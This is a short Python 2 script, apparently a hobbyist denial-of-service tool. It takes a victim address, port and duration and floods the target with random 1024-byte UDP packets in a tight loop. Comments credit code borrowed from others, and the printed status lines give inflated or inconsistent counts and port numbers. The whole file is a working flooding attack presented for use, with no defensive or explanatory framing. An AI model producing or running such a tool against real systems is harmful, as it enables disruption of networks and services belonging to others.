import os,sys
import time
import socket
import random
import sys
#inherit By Dashy Amarillo (Kew)

#color#
""" /033[%sm """
       # 0 = White
       # 31 = red
       # 1;32 = green
       # 33 = yellow

def usage():
    os.system ("python2 dashy.py")
####### flood.Part
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #this code get from HYDRASAVEN
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 3000
    T = 0
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        T = T + 1
        print "\033[1;32m Sended package       \033[0m     <[ \033[33m %s ]> \033[0m     file attack    %s 135"%(sent,T)
        print "attacking at Port :2431"
        #port = 80 (show:2435531)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

##########
if __name__ == '__main__':
    main()
    #  ^ Use To Stop ''while 1'

